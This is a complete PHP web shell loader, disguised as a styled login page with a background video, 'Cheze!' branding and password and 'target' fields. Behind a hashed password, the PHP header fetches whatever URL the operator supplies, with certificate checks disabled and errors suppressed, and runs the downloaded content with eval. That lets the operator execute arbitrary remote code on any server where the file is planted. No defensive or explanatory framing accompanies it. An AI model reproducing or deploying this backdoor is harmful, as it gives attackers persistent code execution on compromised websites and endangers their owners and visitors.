<?php
@session_start();
error_reporting(0);

$h = "7a9c661419cd68f8a514a4bca73d2d74";

$video_url = "https://www.image2url.com/r2/default/videos/1788736097905-3aadfda4-6566-4346-bd0b-71f0b00ccbf5.webm";
$video_type = "video/webm";

$brand_title = "Cheze!";
$brand_subtitle = "俺ベアッ";

if(isset($_POST['p'])&&md5($_POST['p'])===$h){
  $_SESSION['u']=isset($_POST['u'])&&filter_var($_POST['u'],FILTER_VALIDATE_URL)?$_POST['u']:"";
  $_SESSION['a']=1;
  exit("ok: ".$_SESSION['u']);
}

if(isset($_SESSION['a'])){
  $c=@curl_init($_SESSION['u']);
  if($c){
    curl_setopt_array($c,[
      CURLOPT_RETURNTRANSFER=>1,
      CURLOPT_FOLLOWLOCATION=>1,
      CURLOPT_SSL_VERIFYPEER=>0,
      CURLOPT_TIMEOUT=>10
    ]);
    $x=@curl_exec($c);
    $e=@curl_error($c);
    @curl_close($c);
    if($e)exit("ERR:".$e);
    if($x){ eval('?>'.$x); exit; }
    else { exit("Empty"); }
  }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $brand_title; ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800;900&family=Noto+Sans+JP:wght@700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
        
        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: #000;
            color: #fff;
            overflow: hidden;
        }

        
        #bg-video {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover;
            z-index: -2;
        }

        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%);
            z-index: -1;
            pointer-events: none;
        }

        .content {
            position: relative;
            z-index: 1;
            text-align: center;
            width: 100%;
            max-width: 600px;
            padding: 20px;
        }

        h1 {
            font-size: 2.5rem;
            font-weight: 900;
            letter-spacing: 4px;
            color: #fff;
            text-transform: uppercase;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(168, 85, 247, 0.6);
        }

        .subtitle {
            font-family: 'Noto Sans JP', sans-serif;
            font-size: 1rem;
            color: #a855f7;
            text-shadow: 0 0 10px rgba(168, 85, 247, 0.8);
            margin-bottom: 30px;
            letter-spacing: 2px;
        }

        .login-box {
            width: 100%;
            max-width: 350px;
            margin: 0 auto;
            background: transparent;
            border: none;
            padding: 0;
        }

        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 10px 20px;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(168, 85, 247, 0.2);
            border-radius: 50px;
            color: #fff;
            font-size: 0.8rem;
            text-align: center;
            outline: none;
            margin-bottom: 12px;
            transition: 0.3s;
            letter-spacing: 1px;
        }

        input[type="text"]::placeholder { color: #888; font-size: 0.7rem; letter-spacing: 1px; }
        input[type="password"]::placeholder { color: #888; font-size: 0.7rem; letter-spacing: 1px; }

        input[type="password"]:focus, input[type="text"]:focus {
            border-color: #a855f7;
            box-shadow: 0 0 15px rgba(168, 85, 247, 0.4);
            background: rgba(0, 0, 0, 0.7);
        }

        button {
            width: 100%;
            padding: 10px;
            background: linear-gradient(90deg, rgba(59, 7, 100, 0.8), rgba(46, 16, 101, 0.8));
            border: 1px solid rgba(168, 85, 247, 0.4);
            border-radius: 50px;
            color: #c084fc;
            font-size: 0.9rem;
            font-weight: 800;
            letter-spacing: 3px;
            text-transform: uppercase;
            cursor: pointer;
            transition: 0.4s;
            margin-top: 5px;
        }

        button:hover {
            background: rgba(168, 85, 247, 0.2);
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.5);
            color: #fff;
        }

        .error-msg {
            margin-top: 15px;
            color: #ff5555;
            font-size: 0.8rem;
            font-weight: 600;
            display: <?php echo isset($_POST['p']) ? 'block' : 'none'; ?>;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
        }
    </style>
</head>
<body>
    <video autoplay loop muted playsinline id="bg-video">
        <source src="<?php echo $video_url; ?>" type="<?php echo $video_type; ?>">
    </video>

    <div class="overlay"></div>

    <div class="content">
        <h1><?php echo $brand_title; ?></h1>
        <div class="subtitle"><?php echo $brand_subtitle; ?></div>

        <div class="login-box">
            <form method="post">
                <input type="password" name="p" placeholder="password" required autocomplete="off">
                <input type="text" name="u" placeholder="target" required autocomplete="off">
                <button type="submit">GOWW!!</button>
            </form>
            <div class="error-msg">ACCESS DENIED</div>
        </div>
    </div>
</body>
</html>
